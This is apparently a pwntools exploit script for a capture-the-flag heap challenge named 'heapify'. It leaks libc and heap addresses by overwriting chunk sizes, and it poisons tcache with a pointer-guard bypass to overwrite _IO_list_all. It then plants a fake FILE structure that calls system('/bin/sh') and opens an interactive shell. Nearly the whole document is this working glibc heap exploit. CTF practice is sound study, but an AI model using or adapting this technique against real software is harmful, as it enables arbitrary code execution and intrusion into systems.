from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
# context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def solve():
    global t, libc
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def alloc(_size: int, _data: bytes = ""):
        sla(b"choice:", i2b(1))
        sla(b"size: ", i2b(_size))
        sla(b"data: ", _data)

    def delete(idx: int):
        sla(b"choice:", i2b(2))
        sla(b"index: ", i2b(idx))

    def view(idx: int) -> bytes:
        sla(b"choice:", i2b(3))
        sla(b"index: ", i2b(idx))
        return t.recvuntil(b"your ")[:-5]

    alloc(0x28)  # 0
    alloc(0x28)  # 1
    alloc(0x1)  # 2
    alloc(0x1)  # 3
    alloc(0x3E0)  # 4
    alloc(0x28)  # 5
    delete(1)
    alloc(0x28, p8(0) * 0x28 + p64(0x431))
    delete(2)
    alloc(0x1)  # 6
    libc_base = s2u64(view(3).splitlines()[0]) - 0x21ACE0
    print(f"{libc_base=:x}")
    alloc(0x1)  # 7
    alloc(0x1)  # 8
    delete(4)
    heap_base = (s2u64(view(9).splitlines()[0]) - 1) << 12
    print(f"{heap_base=:x}")

    libc.address = libc_base
    fake_io = heap_base + 0x1770
    payload = (
        b"/bin/sh\x00"  # rdi
        + p64(0) * 8
        + p64(1)  # rcx (!=0)
        + p64(2)  # rdx
        + p64(libc.sym["system"])
        + p64(1)
        + p64(0) * 4
        + p64(heap_base + 0x5000)  # writable area
        + p64(0) * 2
        + p64(fake_io + 0x30)
        + p64(0) * 3
        + p64(1)
        + p64(0) * 2
        + p64(libc.sym["_IO_wfile_jumps"] + 0x30)  # _wide_data
        + p64(0) * 6
        + p64(fake_io + 0x40)
        # + p64(fake_io)
    )
    alloc(0x400, payload)
    alloc(0x3C0, payload)

    alloc(0x30)  # 12
    alloc(0x30)  # 13
    alloc(0x30)  # 14
    delete(14)
    delete(13)
    delete(12)
    IO_list_all = libc_base + 0x21B680
    # input(">>")
    alloc(
        0x30, b"A" * 0x38 + p64(0x41) + p64(ptr_guard(heap_base + 0x1BF0, IO_list_all))
    )
    alloc(0x30)
    alloc(0x30, p64(fake_io))
    # input(">>")
    sla(b"choice:", i2b(0))
    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./heapify_patched"
libc_name = "./libc.so.6"
remote_addr, remote_port = "challs.actf.co 31501".split()
if libc_name:
    libc: ELF = ELF(libc_name)
elf: ELF = ELF(elf_name)
script = """
"""
# t = create_io()
t = process(elf.path)
solve()
